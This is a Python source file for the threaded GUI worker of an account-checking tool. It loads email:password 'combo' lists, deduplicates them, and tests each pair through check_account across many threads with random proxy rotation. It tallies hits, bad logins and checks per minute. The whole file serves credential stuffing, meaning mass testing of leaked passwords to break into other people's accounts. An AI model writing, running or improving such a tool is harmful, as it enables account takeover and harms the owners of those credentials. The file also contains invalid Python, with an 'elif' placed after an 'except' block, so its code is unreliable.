from __future__ import annotations

import random
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from pathlib import Path
from typing import Iterable

from PyQt6.QtCore import QObject, QThread, pyqtSignal

from dtv.checker import _UNSET, check_account, parse_combo
from dtv.proxy import parse_proxy_lines


class CheckerSignals(QObject):
    log = pyqtSignal(str)
    stats = pyqtSignal(dict)
    hit = pyqtSignal(str)
    finished = pyqtSignal()


class CheckerWorker(QThread):
    def __init__(
        self,
        combos: list[tuple[str, str]] | None = None,
        combo_file: Path | None = None,
        proxies: list[str] | None = None,
        threads: int = 5,
    ) -> None:
        super().__init__()
        self.signals = CheckerSignals()
        self._combos = combos
        self._combo_file = combo_file
        self._raw_proxies = proxies or []
        self._threads = max(1, threads)
        self._stop = False

    def stop(self) -> None:
        self._stop = True

    def _log(self, message: str) -> None:
        self.signals.log.emit(message)

    def _emit_stats(self, **kwargs) -> None:
        self.signals.stats.emit(kwargs)

    def _iter_lines(self) -> Iterable[str]:
        if self._combos is not None:
            for email, password in self._combos:
                yield f"{email}:{password}"
            return
        if self._combo_file and self._combo_file.exists():
            with self._combo_file.open("r", encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    stripped = line.strip()
                    if stripped:
                        yield stripped

    def run(self) -> None:
        parsed_proxies, invalid_proxies = parse_proxy_lines(self._raw_proxies)
        if invalid_proxies:
            self._log(f"Skipped {len(invalid_proxies)} invalid proxy line(s)")

        parsed_combos: list[tuple[str, str]] = []
        seen: set[str] = set()
        raw_count = 0

        self._log("Preparing combo list...")
        for line in self._iter_lines():
            if self._stop:
                self.signals.finished.emit()
                return
            raw_count += 1
            if raw_count % 10000 == 0:
                self._log(f"Parsed {raw_count:,} lines...")
            parsed = parse_combo(line)
            if not parsed:
                continue
            email, password = parsed
            key = f"{email.lower()}:{password}"
            if key in seen:
                continue
            seen.add(key)
            parsed_combos.append(parsed)

        total = len(parsed_combos)
        if not parsed_combos:
            self._log("No valid combos found")
            self.signals.finished.emit()
            return

        checked = hits = bads = fails = errors = 0
        started_at = time.time()
        self._log(f"Starting — {total:,} combo(s) · {self._threads} threads")

        combo_iter = iter(enumerate(parsed_combos))
        inflight: dict = {}
        max_inflight = max(self._threads * 2, self._threads)

        def pick_proxy(idx: int) -> str | None:
            if not parsed_proxies:
                return None
            if len(parsed_proxies) == 1:
                return parsed_proxies[0]
            return random.choice(parsed_proxies)

        def task(idx: int, email: str, password: str):
            if self._stop:
                return None
            proxy = pick_proxy(idx) if parsed_proxies else _UNSET
            return check_account(email, password, proxy=proxy, timeout=45)

        def submit_next(pool) -> bool:
            if self._stop:
                return False
            try:
                idx, (email, password) = next(combo_iter)
            except StopIteration:
                return False
            future = pool.submit(task, idx, email, password)
            inflight[future] = (email, password)
            return True

        try:
            with ThreadPoolExecutor(max_workers=self._threads) as pool:
                for _ in range(min(max_inflight, total)):
                    if not submit_next(pool):
                        break

                while inflight:
                    done, _ = wait(inflight, return_when=FIRST_COMPLETED)
                    for future in done:
                        email, password = inflight.pop(future)
                        checked += 1
                        try:
                            result = future.result()
                        except Exception as exc:
                            errors += 1
                            self._log(f"ERROR | {email} | {exc}")
                        elif result is not None:
                            line = result.format_line()
                            if result.status == "HIT":
                                hits += 1
                                self.signals.hit.emit(line)
                                self._log(line)
                            elif result.status == "BAD":
                                bads += 1
                                self._log(line)
                            elif result.status == "FAIL":
                                fails += 1
                                self._log(line)
                            else:
                                errors += 1
                                self._log(line)

                        elapsed = max(time.time() - started_at, 0.001)
                        cpm = round((checked / elapsed) * 60, 1)
                        self._emit_stats(
                            total=total,
                            checked=checked,
                            hits=hits,
                            bads=bads,
                            fails=fails,
                            errors=errors,
                            cpm=cpm,
                            current=email,
                        )
                        submit_next(pool)

                    if self._stop:
                        for pending in inflight:
                            pending.cancel()
                        inflight.clear()
                        break
        finally:
            self._log("Job finished")
            self.signals.finished.emit()
